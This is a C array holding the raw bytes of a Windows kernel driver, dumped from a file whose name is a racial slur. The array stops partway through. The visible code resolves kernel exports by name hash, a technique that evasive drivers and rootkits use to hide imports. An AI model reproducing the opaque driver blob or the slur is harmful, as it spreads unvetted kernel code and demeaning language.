/* C:\Users\noxyftw\Downloads\niggers.sys (25.06.2026 20:45:43)
   StartOffset(h): 00000000, EndOffset(h): 0000C5FF, Length(h): 0000C600 */

unsigned char NToskrnl[50688] = {
	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xD0, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,
	0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70,
	0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
	0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20,
	0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
	0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCA, 0x5C, 0xA3, 0x0A,
	0x8E, 0x3D, 0xCD, 0x59, 0x8E, 0x3D, 0xCD, 0x59, 0x8E, 0x3D, 0xCD, 0x59,
	0xF7, 0xBC, 0xCC, 0x58, 0x8D, 0x3D, 0xCD, 0x59, 0x8E, 0x3D, 0xCC, 0x59,
	0x81, 0x3D, 0xCD, 0x59, 0xF7, 0xBC, 0xCE, 0x58, 0x88, 0x3D, 0xCD, 0x59,
	0xF7, 0xBC, 0xC9, 0x58, 0x86, 0x3D, 0xCD, 0x59, 0x17, 0xB4, 0xC8, 0x58,
	0x8F, 0x3D, 0xCD, 0x59, 0x17, 0xB4, 0xCF, 0x58, 0x8F, 0x3D, 0xCD, 0x59,
	0x52, 0x69, 0x63, 0x68, 0x8E, 0x3D, 0xCD, 0x59, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x06, 0x00,
	0x90, 0x1B, 0xED, 0x69, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF0, 0x00, 0x22, 0x00, 0x0B, 0x02, 0x0E, 0x2C, 0x00, 0xAA, 0x00, 0x00,
	0x00, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x57, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00,
	0x0A, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x30, 0x01, 0x00, 0x00, 0x04, 0x00, 0x00, 0x71, 0xD3, 0x00, 0x00,
	0x01, 0x00, 0x60, 0x41, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x30, 0x10, 0x01, 0x00, 0x28, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
	0xD8, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x20, 0x01, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x08, 0xC4, 0x00, 0x00,
	0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0xC0, 0xC2, 0x00, 0x00, 0x48, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00,
	0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00,
	0x15, 0xA4, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0xA6, 0x00, 0x00,
	0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0x94, 0x0B, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00,
	0x00, 0x0C, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48,
	0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0xA0, 0x22, 0x00, 0x00,
	0x00, 0xD0, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xB6, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0xC8, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0xD8, 0x06, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x08, 0x00, 0x00,
	0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48, 0x49, 0x4E, 0x49, 0x54,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x02, 0x00, 0x00, 0x00, 0x10, 0x01, 0x00,
	0x00, 0x04, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x62,
	0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00,
	0x00, 0x20, 0x01, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xC4, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xF4,
	0xC0, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xAD, 0x6C, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xE6, 0xC0, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xDF, 0xC0, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xCA, 0xC0, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xA3, 0xC0, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x89,
	0xC0, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x6F, 0xC0, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x55, 0xC0, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x12, 0xC0,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x7D, 0x30, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xA7, 0xD9, 0x31, 0x0B, 0x5B, 0xC7,
	0xEF, 0xEB, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xC8, 0xBF, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xA4,
	0xBF, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x5D, 0x6B, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x96, 0xBF, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x8F, 0xBF, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x7A, 0xBF, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x53, 0xBF, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x39,
	0xBF, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x1F, 0xBF, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x05, 0xBF, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xC2, 0xBE,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x2D, 0x2F, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xB5, 0x39, 0xB3, 0x0C, 0x20, 0xBC,
	0x16, 0xE1, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x78, 0xBE, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x54,
	0xBE, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x0D, 0x6A, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x46, 0xBE, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x3F, 0xBE, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x2A, 0xBE, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x03, 0xBE, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xE9,
	0xBD, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xCF, 0xBD, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xB5, 0xBD, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x72, 0xBD,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xDD, 0x2D, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x83, 0xD1, 0x53, 0x10, 0x1E, 0x11,
	0x4D, 0xD8, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x28, 0xBD, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x04,
	0xBD, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xBD, 0x68, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xF6, 0xBC, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xEF, 0xBC, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xDA, 0xBC, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xB3, 0xBC, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x99,
	0xBC, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x7F, 0xBC, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x65, 0xBC, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x22, 0xBC,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x8D, 0x2C, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xF3, 0x63, 0xF4, 0x6F, 0x3E, 0xF8,
	0xAD, 0xC8, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xD8, 0xBB, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xB4,
	0xBB, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x6D, 0x67, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xA6, 0xBB, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x9F, 0xBB, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x8A, 0xBB, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x63, 0xBB, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x49,
	0xBB, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x2F, 0xBB, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x15, 0xBB, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xD2, 0xBA,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x3D, 0x2B, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x23, 0x1C, 0x79, 0xE8, 0x00, 0x68,
	0xAE, 0xBE, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x88, 0xBA, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x64,
	0xBA, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x1D, 0x66, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x56, 0xBA, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x4F, 0xBA, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x3A, 0xBA, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
